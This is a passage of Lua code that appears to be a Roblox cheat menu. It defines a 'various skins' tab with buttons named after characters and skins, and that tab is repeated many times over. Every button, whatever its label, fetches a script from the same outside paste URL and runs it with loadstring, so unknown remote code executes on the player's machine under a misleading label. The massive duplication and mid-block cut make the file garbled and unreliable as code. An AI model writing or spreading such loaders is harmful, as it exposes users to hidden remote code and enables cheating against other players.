    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
